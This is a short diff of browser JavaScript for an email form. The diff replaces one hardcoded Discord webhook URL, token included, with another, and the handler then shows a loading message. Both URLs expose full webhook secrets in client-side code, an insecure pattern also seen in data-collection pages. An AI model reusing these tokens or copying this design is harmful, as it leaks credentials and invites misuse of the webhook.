@@ -1,6 +1,6 @@
 document.getElementById('submit-email').addEventListener('click', () => {
     const email = document.getElementById('email').value;
-    const webhookURL = 'https://discord.com/api/webhooks/1313602189872336916/myR3-1YToQt7kmms65UC6ZS9bK6izfO2Ek_AGwrKrTe-ga7t22JYmcyUb7PsqXjAwwPU';
+    const webhookURL = 'https://discord.com/api/webhooks/1313602739917426719/3UlJWzBmkoT4tsWlTtfwqIQRRjcW380nZE1CK_0Qr4tqf9ZpUfN7bM-AECeS1bEoEGej';
 
     const formContainer = document.getElementById('form-container');
     formContainer.innerHTML = '<p>Loading<span id="dots"></span></p>';
